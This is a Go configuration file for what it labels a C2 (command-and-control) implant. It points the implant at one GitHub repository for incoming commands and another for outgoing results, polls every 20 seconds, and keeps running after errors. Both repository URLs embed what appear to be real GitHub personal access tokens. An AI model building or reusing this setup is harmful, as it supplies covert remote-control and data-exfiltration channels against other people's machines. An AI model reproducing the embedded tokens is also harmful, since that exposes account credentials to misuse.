package main

// C2
// Repo Url Format: https://{Token}:x-oauth-basic@github.com/{github_username}/repo
var commandRepoUrl string = "https://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:x-oauth-basic@github.com/diegowentgone/command-test"
var outputRepoUrl string = "https://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:x-oauth-basic@github.com/diegowentgone/output-test"

// Delay
var refreshRate int = 20 // Second

// Sustain
var isIgnoringError bool = true // false will exit when error